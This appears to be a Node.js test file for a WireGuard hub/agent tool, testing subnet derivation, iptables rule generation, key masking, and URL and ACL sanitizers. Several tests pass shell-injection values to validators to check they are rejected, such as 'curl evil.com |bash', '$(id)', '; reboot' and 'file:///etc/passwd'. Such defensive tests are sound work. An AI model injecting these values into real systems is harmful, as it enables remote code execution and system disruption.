import assert from "node:assert/strict";
import test from "node:test";
import { _testExports } from "./agent.js";

const {
	buildHubPostUp,
	buildHubPostDown,
	deriveTunnelSubnet,
	normalizeAgentConfig,
	_parseHubPeerAllowedIPs,
	_rewriteHubPeerAllowedIPs,
	_parseAllowedSites,
	sanitizeHubUrl,
	buildLoopScript,
	sanitizeAclNetworks,
	sanitizeAclSites,
} = _testExports;

// ─── deriveTunnelSubnet ──────────────────────────────────────────────────────

test("deriveTunnelSubnet extracts /24 subnet from Address line", () => {
	assert.equal(deriveTunnelSubnet("Address = 10.10.0.5/24"), "10.10.0.0/24");
	assert.equal(deriveTunnelSubnet("Address = 192.168.1.100/24"), "192.168.1.0/24");
});

test("deriveTunnelSubnet derives /24 from /32 host address", () => {
	assert.equal(deriveTunnelSubnet("Address = 10.10.0.2/32"), "10.10.0.0/24");
	assert.equal(deriveTunnelSubnet("Address = 172.16.5.99/32"), "172.16.5.0/24");
});

test("deriveTunnelSubnet handles /16 and /8 masks", () => {
	assert.equal(deriveTunnelSubnet("Address = 10.0.5.1/16"), "10.0.0.0/16");
	assert.equal(deriveTunnelSubnet("Address = 10.5.3.1/8"), "10.0.0.0/8");
});

test("deriveTunnelSubnet falls back to 10.10.0.0/24 if unparseable", () => {
	assert.equal(deriveTunnelSubnet(""), "10.10.0.0/24");
	assert.equal(deriveTunnelSubnet(null), "10.10.0.0/24");
	assert.equal(deriveTunnelSubnet("no address here"), "10.10.0.0/24");
});

// ─── buildHubPostUp / buildHubPostDown ───────────────────────────────────────

test("buildHubPostUp generates base rules without remote nets", () => {
	const result = buildHubPostUp("10.10.0.0/24");
	assert.ok(result.includes("ip_forward=1"));
	assert.ok(result.includes("-A FORWARD -i %i -j ACCEPT"));
	assert.ok(result.includes("-A FORWARD -o %i -j ACCEPT"));
	assert.ok(result.includes("-s 10.10.0.0/24 -j MASQUERADE"));
});

test("buildHubPostUp adds MASQUERADE rules for each remote net", () => {
	const result = buildHubPostUp("10.10.0.0/24", ["192.168.111.0/24", "192.168.112.0/24"]);
	assert.ok(result.includes("-s 192.168.111.0/24 -j MASQUERADE"));
	assert.ok(result.includes("-s 192.168.112.0/24 -j MASQUERADE"));
});

test("buildHubPostDown mirrors PostUp with -D rules", () => {
	const result = buildHubPostDown("10.10.0.0/24", ["192.168.10.0/24"]);
	assert.ok(result.includes("-D FORWARD -i %i -j ACCEPT"));
	assert.ok(result.includes("-D POSTROUTING ! -o %i -s 192.168.10.0/24 -j MASQUERADE"));
});

test("buildHubPostUp rejects shell injection in tunnel subnet", () => {
	assert.throws(() => buildHubPostUp("10.10.0.0/24; curl evil.com |bash"), /Invalid CIDR/);
});

test("buildHubPostUp rejects shell injection in remote nets", () => {
	assert.throws(() => buildHubPostUp("10.10.0.0/24", ["192.168.1.0/24", "$(whoami)"]), /Invalid CIDR/);
});

test("buildHubPostDown rejects invalid CIDR", () => {
	assert.throws(() => buildHubPostDown("not-a-cidr"), /Invalid CIDR/);
});

// ─── normalizeAgentConfig ────────────────────────────────────────────────────

const SAMPLE_CONFIG = `[Interface]
Address = 10.10.0.5/24
PrivateKey = abc123secret
PostUp = old-custom-rule
PostDown = old-custom-rule-down

[Peer]
PublicKey = hubkey123
Endpoint = hub.example.com:51821
AllowedIPs = 10.10.0.0/24, 192.168.10.0/24
PersistentKeepalive = 25`;

test("normalizeAgentConfig masks PrivateKey", () => {
	const result = normalizeAgentConfig(SAMPLE_CONFIG);
	assert.ok(result.includes("PrivateKey = (hidden)"));
	assert.ok(!result.includes("abc123secret"));
});

test("normalizeAgentConfig strips old PostUp/PostDown and inserts hub-managed ones", () => {
	const result = normalizeAgentConfig(SAMPLE_CONFIG);
	assert.ok(!result.includes("old-custom-rule"));
	assert.ok(result.includes("PostUp = sysctl -w net.ipv4.ip_forward=1"));
	assert.ok(result.includes("PostDown = iptables -D FORWARD"));
});

test("normalizeAgentConfig inserts Table = off when missing", () => {
	const result = normalizeAgentConfig(SAMPLE_CONFIG);
	assert.ok(result.includes("Table = off"));
});

test("normalizeAgentConfig does not duplicate Table if already present", () => {
	const withTable = SAMPLE_CONFIG.replace("PrivateKey = abc123secret", "PrivateKey = abc123secret\nTable = off");
	const result = normalizeAgentConfig(withTable);
	const matches = result.split("Table = off").length - 1;
	assert.equal(matches, 1);
});

test("normalizeAgentConfig includes MASQUERADE for remote site nets", () => {
	const result = normalizeAgentConfig(SAMPLE_CONFIG, ["192.168.200.0/24", "192.168.210.0/24"]);
	assert.ok(result.includes("-s 192.168.200.0/24 -j MASQUERADE"));
	assert.ok(result.includes("-s 192.168.210.0/24 -j MASQUERADE"));
});

test("normalizeAgentConfig places PostUp/PostDown before [Peer]", () => {
	const result = normalizeAgentConfig(SAMPLE_CONFIG);
	const postUpIdx = result.indexOf("PostUp");
	const peerIdx = result.indexOf("[Peer]");
	assert.ok(postUpIdx < peerIdx, "PostUp should come before [Peer]");
});

// ─── _parseHubPeerAllowedIPs ─────────────────────────────────────────────────

test("_parseHubPeerAllowedIPs extracts AllowedIPs from first Peer section", () => {
	const config = `[Interface]
Address = 10.10.0.5/24

[Peer]
PublicKey = hubkey
AllowedIPs = 10.10.0.0/24, 192.168.10.0/24, 192.168.40.0/24
PersistentKeepalive = 25`;
	const result = _parseHubPeerAllowedIPs(config);
	assert.deepEqual(result, ["10.10.0.0/24", "192.168.10.0/24", "192.168.40.0/24"]);
});

test("_parseHubPeerAllowedIPs returns empty array when no Peer section", () => {
	const config = "[Interface]\nAddress = 10.10.0.5/24";
	assert.deepEqual(_parseHubPeerAllowedIPs(config), []);
});

// ─── _rewriteHubPeerAllowedIPs ───────────────────────────────────────────────

test("_rewriteHubPeerAllowedIPs replaces AllowedIPs in first Peer", () => {
	const config = `[Interface]
Address = 10.10.0.5/24

[Peer]
PublicKey = hubkey
AllowedIPs = 10.10.0.0/24
PersistentKeepalive = 25`;
	const result = _rewriteHubPeerAllowedIPs(config, ["10.10.0.0/24", "192.168.10.0/24"]);
	assert.ok(result.includes("AllowedIPs = 10.10.0.0/24, 192.168.10.0/24"));
	assert.ok(!result.includes("AllowedIPs = 10.10.0.0/24\n"));
});

// ─── _parseAllowedSites ──────────────────────────────────────────────────────

test("_parseAllowedSites returns null for empty/null input (full mesh)", () => {
	assert.equal(_parseAllowedSites(null), null);
	assert.equal(_parseAllowedSites(""), null);
	assert.equal(_parseAllowedSites("[]"), null);
});

test("_parseAllowedSites returns Set of site names from JSON array", () => {
	const result = _parseAllowedSites('["Floppy Home", "Daniel Home"]');
	assert.ok(result instanceof Set);
	assert.ok(result.has("Floppy Home"));
	assert.ok(result.has("Daniel Home"));
	assert.equal(result.size, 2);
});

test("_parseAllowedSites returns null for invalid JSON", () => {
	assert.equal(_parseAllowedSites("not json"), null);
});

// ─── sanitizeHubUrl ──────────────────────────────────────────────────────────

test("sanitizeHubUrl accepts http and https URLs", () => {
	assert.equal(sanitizeHubUrl("https://proxy.comnic.de"), "https://proxy.comnic.de");
	assert.equal(sanitizeHubUrl("http://10.10.0.1:3300"), "http://10.10.0.1:3300");
});

test("sanitizeHubUrl strips trailing slashes", () => {
	assert.equal(sanitizeHubUrl("https://proxy.comnic.de/"), "https://proxy.comnic.de");
	assert.equal(sanitizeHubUrl("http://10.10.0.1:3300///"), "http://10.10.0.1:3300");
});

test("sanitizeHubUrl rejects empty, null and non-string", () => {
	assert.equal(sanitizeHubUrl(""), null);
	assert.equal(sanitizeHubUrl("   "), null);
	assert.equal(sanitizeHubUrl(null), null);
	assert.equal(sanitizeHubUrl(undefined), null);
	assert.equal(sanitizeHubUrl(123), null);
});

test("sanitizeHubUrl rejects non-http(s) protocols", () => {
	assert.equal(sanitizeHubUrl("ftp://host/x"), null);
	assert.equal(sanitizeHubUrl("file:///etc/passwd"), null);
	assert.equal(sanitizeHubUrl("javascript:alert(1)"), null);
});

test("sanitizeHubUrl rejects shell/sed metacharacters (config.env injection guard)", () => {
	assert.equal(sanitizeHubUrl("http://h/$(id)"), null);
	assert.equal(sanitizeHubUrl("http://h;reboot"), null);
	assert.equal(sanitizeHubUrl("http://h|cat"), null);
	assert.equal(sanitizeHubUrl('http://h"x'), null);
	assert.equal(sanitizeHubUrl("http://h x"), null);
});

// ─── buildLoopScript: hub-URL propagation + register-retry ───────────────────

test("buildLoopScript adopts server-advertised hub URLs", () => {
	const script = buildLoopScript("native");
	assert.match(script, /update_server_urls\(\)/);
	assert.match(script, /get\('primary_url'\)/);
	assert.match(script, /get\('fallback_url'\)/);
	assert.match(script, /update_server_urls "\$NEW_PRIMARY" "\$NEW_FALLBACK"/);
	// Never overwrites a working URL with an empty one
	assert.match(script, /\[ -n "\$new_primary" \] && \[ "\$new_primary" != "\$PRIMARY_URL" \]/);
});

test("buildLoopScript retries registration when /config rejects a reg_token", () => {
	const script = buildLoopScript("native");
	assert.match(script, /api\/agent\/register/);
	assert.match(script, /reg_token/);
	assert.match(script, /Recovered registration on poll/);
});

// ─── sanitizeAclNetworks / sanitizeAclSites (CSO finding #1) ──────────────────

test("sanitizeAclNetworks accepts, trims and dedupes valid CIDRs", () => {
	assert.deepEqual(sanitizeAclNetworks(["192.168.11.0/24", " 10.0.0.0/8 ", "192.168.11.0/24"]), [
		"192.168.11.0/24",
		"10.0.0.0/8",
	]);
});

test("sanitizeAclNetworks returns null for null/undefined", () => {
	assert.equal(sanitizeAclNetworks(null), null);
	assert.equal(sanitizeAclNetworks(undefined), null);
});

test("sanitizeAclNetworks rejects a non-array", () => {
	assert.throws(() => sanitizeAclNetworks("192.168.11.0/24"), /must be an array/);
});

test("sanitizeAclNetworks rejects shell-injection / non-CIDR entries (root ip route sink)", () => {
	assert.throws(() => sanitizeAclNetworks(["10.0.0.0/24", "1.2.3.0/24; reboot"]), /invalid CIDR/);
	assert.throws(() => sanitizeAclNetworks(["$(id)"]), /invalid CIDR/);
	assert.throws(() => sanitizeAclNetworks(["notacidr"]), /invalid CIDR/);
});

test("sanitizeAclNetworks rejects out-of-range octets/prefix that pass the shape regex", () => {
	// CIDR_RE shape-matches these but `ip route add` would reject them → tunnel down
	assert.throws(() => sanitizeAclNetworks(["999.0.0.0/99"]), /invalid CIDR/);
	assert.throws(() => sanitizeAclNetworks(["10.0.0.256/24"]), /invalid CIDR/);
	assert.throws(() => sanitizeAclNetworks(["10.0.0.0/33"]), /invalid CIDR/);
});

test("sanitizeAclNetworks rejects any /0 route incl. aliases (default-route hijack)", () => {
	assert.throws(() => sanitizeAclNetworks(["0.0.0.0/0"]), /default route/);
	assert.throws(() => sanitizeAclNetworks(["0.0.0.0/00"]), /default route/);
	assert.throws(() => sanitizeAclNetworks(["10.0.0.0/0"]), /default route/);
});

test("sanitizeAclNetworks treats empty array as null (no restriction = full mesh)", () => {
	assert.equal(sanitizeAclNetworks([]), null);
	assert.equal(sanitizeAclNetworks(["", "   "]), null);
});

test("buildLoopScript rate-limits the register-retry (no per-poll /register hammering)", () => {
	const script = buildLoopScript("native");
	assert.match(script, /LAST_REG_ATTEMPT=/);
	assert.match(script, /REGISTER_RETRY_INTERVAL=/);
	assert.match(script, /NOW - LAST_REG_ATTEMPT.*-ge.*REGISTER_RETRY_INTERVAL/);
});

test("buildLoopScript verifies a hub URL is reachable before adopting it, and upserts", () => {
	const script = buildLoopScript("native");
	// reach-check guards adoption so a typo'd hub URL can't brick the agent
	assert.match(script, /\[ "\$new_primary" != "\$PRIMARY_URL" \] && reach "\$new_primary"/);
	assert.match(script, /reach "\$new_fallback"/);
	// upsert appends the line if missing instead of silently no-op'ing
	assert.match(script, /upsert_env\(\)/);
	assert.match(script, /printf '%s="%s"/);
});

test("sanitizeAclSites coerces to trimmed non-empty strings, no CIDR check", () => {
	assert.deepEqual(sanitizeAclSites(["Floppy Home", "  ", " Hinderlich Office "]), [
		"Floppy Home",
		"Hinderlich Office",
	]);
	assert.equal(sanitizeAclSites(null), null);
	assert.equal(sanitizeAclSites("nope"), null);
	assert.equal(sanitizeAclSites([]), null);
	assert.equal(sanitizeAclSites(["", " "]), null);
});
